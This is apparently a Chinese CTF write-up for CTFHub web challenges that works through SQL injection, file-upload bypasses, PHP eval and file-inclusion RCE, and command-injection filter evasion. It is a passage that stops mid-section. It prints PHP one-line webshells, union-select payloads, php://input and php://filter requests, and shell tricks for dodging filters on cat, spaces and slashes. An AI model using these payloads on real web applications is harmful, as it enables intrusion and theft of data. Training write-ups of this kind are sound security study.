<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id = 1 order by 3 <span class="comment"># 1和2均可回显，说明数据库有两行</span></span><br><span class="line">id=-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>；<span class="comment"># 查看页面回显位，发现1，2都可以进行回显</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">version</span>(),<span class="keyword">database</span>() <span class="comment"># 开始注入，获取数据库版本和数据库名 </span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'sqli'</span> <span class="comment"># 因为数据库版本大于5.0，所以我们可以通过查询information_schema表来获取表名和列名，获得表名称为gdctsoiitj</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'gdctsoiitj'</span> <span class="comment"># 得到表名后，继续查询列名，获得列名称为zrxzhzkosa</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> zrxzhzkosa,<span class="number">2</span> <span class="keyword">from</span> gdctsoiitj <span class="comment"># 得到列名后，查询数据得到flag，需要注意这题的表名和列名每个环境都不一样</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>为什么id=-1而不是1</p>
<blockquote>
<pre><code>1. 经过查阅资料得知，数据库中id的数据类型设置为int（数值类型）就会出现这种情况，如果数据库检查到id的参数并不为数值的话，就会发生类型转换
2. 本题ID=1，我想注入的时候就不能再注ID=1了(要查询数据库不存在的结果，否则存在的结果占位显示我们就看不到第二行的数据)
3. 用联合查询语句union select语句来注入，从而判断显示位,同时也是判断注入点，此时要先保证之前的数据查不出来才能判断注入位置，不然就会一直在注入当前的数据库，无法注入新的值来判断注入点，之后再union select id=-1数据不存在数据库中，可以看到位置2可以插入SQL语句。</code></pre><p>总结一下：<br>比如字符串’1’会被转换为1</p>
<p>比如字符串’1”‘会被转换为1</p>
<p>比如’1 and 1=1’会被识别为1</p>
<p>比如’1 and 1=2’会被识别为1</p>
<p>比如’1akbucbdadbaiudadbabdaud’会被识别为1</p>
<p>比如’23adasuasdai32ansoiha’会被识别为23</p>
<p>字符串中数字后面的字符可以是任意的，类型转换时都会被忽略，不会对数值有任何的影响</p>
</blockquote>
</li>
<li><p>为什么要用到<code>group_concat</code></p>
<blockquote>
<p>因为需要在一行输出所有的结果</p>
</blockquote>
</li>
</ul>
<h4><span id="ua注入">UA注入</span></h4><ul>
<li>和cookie注入流程一致</li>
</ul>
<h4><span id="referer注入">Referer注入</span></h4><ul>
<li>和cookie注入流程一致</li>
</ul>
<h4><span id="过滤空格">过滤空格</span></h4><p>随着黑客技术的提升，我们开发人员的防护措施也越来越多，为了防止sql注入，开发人员通常会在后台过滤某些非正常用户输入的字符，例如union、select、单引号双引号等等。</p>
<ul>
<li>可以通过/**/来代替空格</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1 and 1 = 1 <span class="comment"># 发现被过滤了</span></span><br><span class="line">1<span class="comment">/**/</span>and<span class="comment">/**/</span>1<span class="comment">/**/</span>=<span class="comment">/**/</span>1 <span class="comment"># 发现正确，继续构造payload语句，发现等于2时回显错误，说明此题存在过滤空格注入</span></span><br><span class="line">1<span class="comment">/**/</span>order<span class="comment">/**/</span>by<span class="comment">/**/</span>2 <span class="comment"># 查看有几位</span></span><br><span class="line">1<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span> <span class="comment"># 发现无回显，需要加负号操作</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span> <span class="comment"># 成功发现回显</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">version</span>() <span class="comment"># 发现回显位</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">database</span>()</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name)<span class="keyword">from</span><span class="comment">/**/</span>information_schema.schemata <span class="comment"># 查看所有数据库</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">group_concat</span>(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="string">'sqli'</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">group_concat</span>(column_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="string">'sqli'</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span>table_name=<span class="string">'lqsyncyuso'</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">group_concat</span>(nuyietobbn)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sqli.lqsyncyuso</span><br></pre></td></tr></table></figure>

<h3><span id="文件上传">文件上传</span></h3><ul>
<li>tips: MacBook上有个坑，上传隐藏文件时候需要配合命令<code>command+shift+.</code></li>
</ul>
<h4><span id="无验证">无验证</span></h4><ol>
<li>通过Wappalyzer来查看当前页面的基础环境，如中间件，前后端语言等 </li>
<li>将一句话木马上传到服务器</li>
</ol>
<ul>
<li>php的一句话木马</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(@$_POST[<span class="string">'a'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>通过中国蚁剑进行控制，找到flag</li>
</ol>
<h4><span id="前端验证">前端验证</span></h4><ul>
<li>和无验证差不多，唯一的区别是前端检查了我们上传的文件名。</li>
</ul>
<ol>
<li>禁用js来解决</li>
<li>使用burpsuite，先将一句话木马后缀修改成.png，然后抓包后缀修改成php，从而达到攻击的目的</li>
</ol>
<h4><span id="htaccess">.htaccess</span></h4><blockquote>
<p>htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
</blockquote>
<ol>
<li><p>使用 FilesMatch 命令生成一个.htaccess 文件进行上传，绕过白名单中的漏洞</p>
<ul>
<li><p>需要构造.htaccess文件，其中<code>FilesMatch</code> 就是我们要上传的文件</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> "<span class="attr">payload</span>"&gt;</span></span><br><span class="line"> SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>上传一句话木马，名字为FilesMatch设置的<code>payload</code></p>
</li>
</ul>
</li>
<li><p>使用passthru执行外部命令</p>
<ul>
<li>第一步一样是构造.htaccess文件</li>
<li>第二步，使用passthru执行外部命令</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">passthru(<span class="string">"ls /var/www/"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后通过浏览器访问<code>http://xxxx/upload/payload</code>来执行命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">passthru(<span class="string">"cat /var/www/html/flag_828011517.php"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>添加.htaccess文件</p>
<ul>
<li>句话的作用是：让jpg文件中的php语句执行，这句语句放到.htaccess文件中，Apache运行的时候会解析这个文件中的配置，检测到这句话以后，jpg文件中的php语句才会执行</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>

<ul>
<li>上传一句话木马，以.jpg结尾</li>
<li>使用蚁剑进行连接</li>
</ul>
</li>
</ol>
<h4><span id="mime">MIME</span></h4><ul>
<li>上传php文件，并将content-type改成image/png即可</li>
</ul>
<h4><span id="文件头检查">文件头检查</span></h4><p>原理：服务器会检查png的头格式</p>
<ul>
<li><p>截图上传文件，通过<code>burpsuite</code>进行代理</p>
</li>
<li><p>在图片后面添加一句话木马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>($_REQUEST[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改文件后缀.php</p>
</li>
<li><p>使用蚁剑连接</p>
</li>
</ul>
<h4><span id="00截断">00截断</span></h4><p><strong>%00的使用是在路径上</strong></p>
<p>就是在.php文件后加上%00后接.jpg，这里我们就可以绕过对php文件的过滤。在执行时，%00会把后面的.jpg截断，所以执行的时候他执行的仍然是前面的.php文件。就可以实现我们的马子文件的执行。</p>
<h4><span id="双写后缀">双写后缀</span></h4><p>原理：服务器会替换后缀’php’-&gt;’’，因此我们只需要拼接后缀为”pphphp”即可</p>
<h3><span id="rce">RCE</span></h3><h4><span id="eval执行">eval执行</span></h4><p>进入后题目</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_REQUEST[<span class="string">"cmd"</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>尝试在URL中带上名为cmd的参数：（此处<code>system()</code>函数的作用为执行系统命令并输出执行结果）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...&#x2F;?cmd&#x3D;system(&quot;pwd&quot;);</span><br></pre></td></tr></table></figure>

<p>执行成功 此处需要注意参数结尾一定不能省略<code>;</code>，满足PHP语法才可以执行成功。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.../?cmd=system("ls%20/");</span><br><span class="line">.../?cmd=system("cat%20/flag_xxxx");</span><br></pre></td></tr></table></figure>

<h4><span id="文件包含">文件包含</span></h4><ul>
<li>考察<code>include</code>函数</li>
</ul>
<p>访问shell页面，发现有一句话木马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_REQUEST[<span class="string">'ctfhub'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>假如在index.php中include了一个文件，那么不管这个文件后缀是什么  这个文件中的内容将会直接出现在index.php中，所以这道题的payload构造思路就是把shell.txt里的内容想办法放到index.php中去根据源码构造payload：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=shell.txt</span><br></pre></td></tr></table></figure>

<p>直接使用蚁剑后缀加上payload即可</p>
<h4><span id="phpinput">php://input</span></h4><p><a href="https://blog.csdn.net/qq_51295677/article/details/123462929" target="_blank" rel="noopener">参考文献</a></p>
<p>常用到伪协议的<code>php://input</code>和<code>php://filter</code>.其中<code>php://input</code>要求<code>allow_url_include</code>设置为<code>On</code></p>
<ul>
<li>使用burp suite的repeater发送请求，构造请求报文</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=php://input</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: challenge-9144f5dff97c39a1.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Length</span>: 35</span><br><span class="line"></span><br><span class="line">&lt;?php system("cat /flag_5734");?&gt;</span><br></pre></td></tr></table></figure>

<p>得到返回</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: openresty/1.19.3.2</span><br><span class="line">Date: Thu, 06 Apr 2023 08:05:02 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 113</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: PHP/5.6.40</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Headers: X-Requested-With</span><br><span class="line">Access-Control-Allow-Methods: *</span><br><span class="line"></span><br><span class="line">ctfhub&#123;8c628d8ea62d6dc8316f15c3&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">i don't have shell, how to get flag? <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"phpinfo.php"</span>&gt;</span>phpinfo<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4><span id="读取源代码">读取源代码</span></h4><p><a href="https://blog.csdn.net/qq_61839115/article/details/128593214" target="_blank" rel="noopener">参考</a></p>
<ul>
<li>考点：<code>php://filter</code>可以作为一个中间流来处理其他流，具有四个参数。</li>
</ul>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>resource=&lt;要过滤的数据流&gt;</td>
<td>指定了你要筛选过滤的数据流。</td>
<td>必选</td>
</tr>
<tr>
<td>read=&lt;读链的筛选列表&gt;</td>
<td>可以设定一个或多个过滤器名称，以管道符（</td>
<td>）分隔。</td>
</tr>
<tr>
<td>write=&lt;写链的筛选列表&gt;</td>
<td>可以设定一个或多个过滤器名称，以管道符（</td>
<td>）分隔。</td>
</tr>
<tr>
<td>&lt;；两个链的筛选列表&gt;</td>
<td>任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td>
<td></td>
</tr>
</tbody></table>
<p>这道题就直接构造payload了</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/resource=/flag</span><br></pre></td></tr></table></figure>

<p>有些比赛赛题情况下还要用base64输出</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=<span class="built_in">convert</span>.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure>

<p>使用burp suite</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /?file=php://filter/resource=/flag HTTP/1.1</span><br><span class="line">Host: challenge-d9e9d5fbc32a97fe.sandbox.ctfhub.com:10800</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>返回</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: openresty/1.19.3.2</span><br><span class="line">Date: Thu, 06 Apr 2023 08:34:10 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 106</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: PHP/5.6.40</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Headers: X-Requested-With</span><br><span class="line">Access-Control-Allow-Methods: *</span><br><span class="line"></span><br><span class="line">ctfhub&#123;d797f76a6ac67e494a84fa86&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">i don't have shell, how to get flag? <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">flag in <span class="tag">&lt;<span class="name">code</span>&gt;</span>/flag<span class="tag">&lt;/<span class="name">code</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4><span id="远程包含">远程包含</span></h4><ul>
<li>解法1：和input那题解法一样</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /?file=php://input HTTP/1.1</span><br><span class="line">Host: challenge-795660de70a9ad8e.sandbox.ctfhub.com:10800</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 28</span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> system(<span class="string">"cat /flag"</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>返回</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: openresty/1.19.3.2</span><br><span class="line">Date: Thu, 06 Apr 2023 08:53:48 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 112</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: PHP/5.6.40</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Headers: X-Requested-With</span><br><span class="line">Access-Control-Allow-Methods: *</span><br><span class="line"></span><br><span class="line">ctfhub&#123;db258363d74e58371cd85c86&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">i don't have shell, how to get flag?<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"phpinfo.php"</span>&gt;</span>phpinfo<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>解法2：</p>
<p>题目目的是想让我们自己搭个服务器，然后让靶机远程包含我们的代码，但是我并没有租赁VPS。</p>
</li>
</ul>
<p><a href="https://www.wolai.com/ctfhub/64arrieDUUPZTc1eFm6LLC" target="_blank" rel="noopener">参考答案</a></p>
<h4><span id="命令注入">命令注入</span></h4><p> 命令行注入漏洞是指web应用程序中调用了系统可执行命令的函数，而且输入参数是可控的，如果黑客拼接了注入命令，就可以进行非法操作了。</p>
<p><strong>Windows系统支持的管道符如下：</strong></p>
<ol>
<li>“|”：直接执行后面的语句。</li>
<li>“||”：如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。</li>
<li>“&amp;”：两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。</li>
<li>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</li>
</ol>
<p><strong>Linux系统支持的管道符如下：</strong></p>
<ol>
<li>“;”：执行完前面的语句再执行后面的语句。</li>
<li>“|”：显示后面语句的执行结果。</li>
<li>“||”：当前面的语句执行出错时，执行后面的语句。</li>
<li>“&amp;”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。</li>
<li>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</li>
</ol>
<ul>
<li><p>解法一：使用base64编码</p>
<ul>
<li><p>我们在框内输入</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> | ls # 输出两个php文件</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> | ls / #根目录没发现其他可疑文件</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> &amp; cat <span class="number">31007322329204</span>.php # 未回显</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> &amp; cat <span class="number">31007322329204</span>.php | base64 #使用base64编码</span><br><span class="line"># 解码后获得&lt;?php // ctfhub&#123;ed09b50ed879851ad5b5a4d9&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>解法二：重定向</p>
<ul>
<li>我们可以用重定向的方法注入一个一句话木马</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&amp;<span class="built_in">echo</span> -e "&lt;?php @eval(\$_POST['test']);?&gt;" &gt; shell.php</span><br></pre></td></tr></table></figure>

<ul>
<li>使用蚁剑连接即可</li>
</ul>
</li>
</ul>
<h4><span id="过滤cat">过滤cat</span></h4><p>3.使用单引号绕过 </p>
<p>127.0.0.1; c’’at flag_2287214057241.php |base64<br>4.使用双引号绕过 </p>
<p>127.0.0.1; c””at flag_2287214057241.php |base64<br>5.利用Shell 特殊变量绕过</p>
<p>127.0.0.1; ca$@t flag_2287214057241.php|base64</p>
<h4><span id="过滤空格">过滤空格</span></h4><p>空格可以用以下字符代替：<br><code>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS</code>等</p>
<p>$IFS在linux下表示分隔符，但是如果单纯的cat$IFS2，bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，因此这里加一个{}就固定了变量名。<br>同理，在后面加个$可以起到截断的作用，使用$9是因为它是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p>
<h4><span id="过滤目录分割符">过滤目录分割符</span></h4><p>思路上来说应该是cat文件，必须要使用目录分隔符/，但是题目给过滤。需要另外寻找办法  </p>
<ul>
<li>法一：使用cd绕开</li>
</ul>
<p>linux中：<code>%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</code></p>
<p>windows中：<code>%0a、&amp;、|</code></p>
<p>其中分号;的作用就是在 shell 中，担任”连续指令”功能</p>
<p>&amp;&amp;的方式：command1 &amp;&amp; command2 如果command1执行成功，则执行command2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cd flag_is_here;cat flag_164641924722716.php|base64</span><br></pre></td></tr></table></figure>

<h4><span id="过滤运算符">过滤运算符</span></h4><ul>
<li>发现题目没有过滤<code>;</code>因此我们可以直接使用</li>
<li>在f12中的pre标签里面有注释</li>
</ul>
<h4><span id="综合练习">综合练习</span></h4><p><a href="https://blog.csdn.net/weixin_45897324/article/details/109271622" target="_blank" rel="noopener">url查看表</a></p>
<ul>
<li><p>题解一</p>
<p>%0a 代替 换行 ，<code>%09</code>代替 TAB键 （因为flag被过滤了，所以我们通过TAB来补全flag_is_here ）<code>%5c</code> 代替 \（用 \ 来分隔开 cat ，因为 cat 也被过滤了qwq）</p>
<p>这题得在地址栏输入</p>
